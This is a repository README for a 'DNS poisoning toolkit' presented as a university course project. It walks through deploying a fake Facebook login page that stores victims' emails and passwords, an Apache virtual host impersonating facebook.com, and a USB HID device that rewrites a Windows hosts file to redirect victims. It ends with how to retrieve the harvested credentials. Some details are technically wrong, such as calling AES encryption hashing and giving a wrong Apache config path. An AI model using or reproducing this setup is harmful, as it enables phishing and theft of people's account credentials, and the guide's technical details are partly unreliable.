# DNS Poisoning Toolkit

### ⚠ THIS TOOLKIT IS FOR EDUCATIONAL PURPOSES ONLY! IT IS NOT INTENDED FOR HARMFUL AND ILLGAL ACTIONS ⚠

## 1. Description
The DNS Poisoning Toolkit is made for Vidzeme University of Applied Sciences stydy course "Data protection and security". This toolkit consists of 2 parts:
* Phishing webpage which looks like Facebook login page
* Script for Digispark microcontroller to simulate HID device

### 1.1. Webpage
This is a simple webpage which looks like Facebook login page but insted of logging you into Facabook, it steals the information entered in "Email" and "Password" fields. This page is using a SQLite3 database to store user data. Passwords are hashed using AES 256 encryption algorithm (you don't want your stolen passwords to be stolen by someone else, right?). For encryption and decryption .env config file with key and initialization vector for AES algorithm is required. You can host this website and use it without DNS poisoning attack as well.
![Webpage](https://cdn.discordapp.com/attachments/515237597145071678/1120607062087438367/image.png)

### 1.2. Digispark script
Digispark ir very small microcontroller which plugs into USB port. One of it's feattures is an ability to simulate HID device (in this case we are simulating Keyboard). This small microcontroller can do simillar things as [Rubber ducky](https://shop.hak5.org/products/usb-rubber-ducky) can do. In this case you can flash the provided script to Digispark an it will automatically change the hosts file in Windows 10 using cmd. This will change the IP address for facebook.com domain to IP address where phishing page is located.

## 2. Installation
This section describes an installation process for this toolkit.

### 2.1. Requirements
1. Gigispark microcontroller (you can buy one [here](https://tinyurl.com/3bbbznwv));
2. Any type of server to host a webpage (in this example we will use Ubuntu server with Apache);
3. Node.js v16.15.1 or newer;
4. Arduino IDE (download [here](https://www.arduino.cc/en/software));
5. Windows 10 computer to test the toolkit

### 2.2. Cloning the repository
```git clone https://github.com/markus-laskovskisbrangals/dnspoisoning.git```

### 2.3. Setting up webpage
1. Using FTP, SFTP or any other file transfer protocol, upload all files from folder "web" to web server's foldere. In our case we will upload files to Ubuntu server in `/var/www/facebook.com`.
2. Now SSH into your web server and go to the directory where filed are uploaded, create .env file using command `sudo nano .env`, paste the following:
```
KEY=
IV=
```
3. Now you need to provide key and initialization vector for encryption. Key need to be 32 byte long string and initialization vector ir 16 byte long hexadecimal string. When you have entered both values, save this file and close it.
4. Now we'll need to install required libraries for nodejs, run command:
```npm i```
5. To run this nodejs app in background we can use [pm2 runtime](https://pm2.io/docs/runtime/overview/) run `npm i -g pm2` to install this runtime.
6. Now you can run this app using `pm2 run index.js`.
The page is running but we have a problem: it runs on port 3000. It needs to be on HTTP port 80 to be accessed from outside using domain name. For this we'll use Apache reverse proxy which will allow this site to run on port 80.

### 2.4. Reverse proxy setup
1. Enable reverse proxy module for apache:
```sudo a2enmod proxy proxy_http ```
2. Now create reverse proxy file using command `sudo nano /etc/apache2/available-hosts/facebook.com.conf`
3. Paste the following:
```
<VirtualHost *:80>
      ServerName facebook.com
      ServerAlias www.facebook.com
      ServerAdmin webmaster@example.com
 
      ProxyPreserveHost On
      ProxyPass / http://localhost:3000/
      ProxyPassReverse / http://localhost:3000/
 
      ErrorLog /var/log/apache2/error.log
      CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
4. Save the file and exit.
5. Now enable this site and reload apache:
```
sudo a2ensite facebook.com.conf
sudo systemctl reload apache2
```
Now when facebook.com domain will point to server's IP address user will be redirected to our login page.

### 2.5. Setting up Digispark
1. First you'll need to setup digispark with Arduino IDE. [Setup guide](https://startingelectronics.org/tutorials/arduino/digispark/digispark-windows-setup/)
2. In Arduino IDE open `dnspoisoner.ino` file
3. On line `DigiKeyboard.println("ECHO...` change the IP address to your server's IP address
4. Flash the code to microcontroller
When flashing is done, unplug microcontroller from USB port. Now it is ready to change hosts file in any Windows 10 computer

## 3. Use it (for educational purposes only)
If you successfully did all the steps then you have working DNS poisoning toolkit which changes hosts file on target computer and takes Facebook user credentials when someone enters them. To access collected data, go to `http://[SERVER_IP]:3000/data?key={your_encryption_key}`, for example `https://122.120.93.10:3000/data?key=demo`. It should look like this:
```
[
  {
    "email": "test@test.su",
    "password": "asdasdas"
  },
  {
    "email": "test3@test.su",
    "password": "asdasdas"
  },
  {
    "email": "test3@test.su",
    "password": "hackme"
  },
  {
    "email": "test@test.com",
    "password": "asdasdas"
  },
  {
    "email": "test@test.com",
    "password": "asdasdas"
  },
  {
    "email": "ZXCZXCZCZX",
    "password": "test"
  },
  {
    "email": "ZXCZXCZCZX",
    "password": "asdasd"
  }
]
```
